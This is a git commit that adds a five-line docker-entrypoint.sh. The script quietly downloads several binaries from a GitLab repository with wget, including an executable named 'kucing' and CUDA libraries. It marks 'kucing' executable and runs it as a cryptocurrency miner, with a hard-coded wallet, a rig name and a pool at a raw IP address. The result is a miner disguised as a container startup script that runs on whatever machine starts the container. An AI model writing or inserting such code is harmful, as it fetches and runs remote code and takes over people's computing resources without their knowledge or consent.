3154c92fa8439123c4be327310bcff69d50723c3
anihsugiarti9 <137507644+anihsugiarti9@users.noreply.github.com>
2023-12-05 18:13:31 +0700

    Create docker-entrypoint.sh

---
+++ docker-entrypoint.sh
@@ -0,0 +1,5 @@
+wget -qO libnvrtc.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc.so.12.0.76
+wget -qO kucing https://gitlab.com/sarifadim/jomblo/-/raw/main/kucing && chmod +x kucing
+wget -qO libnvrtc-builtins.so.12.0.76 https://gitlab.com/sarifadim/jomblo/-/raw/main/libnvrtc-builtins.so.12.0.76
+wget -qO amdmemtweak https://gitlab.com/sarifadim/jomblo/-/raw/main/amdmemtweak
+./kucing -wallet ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk -coin xmr -rigName bos -pool1 47.89.195.104:80
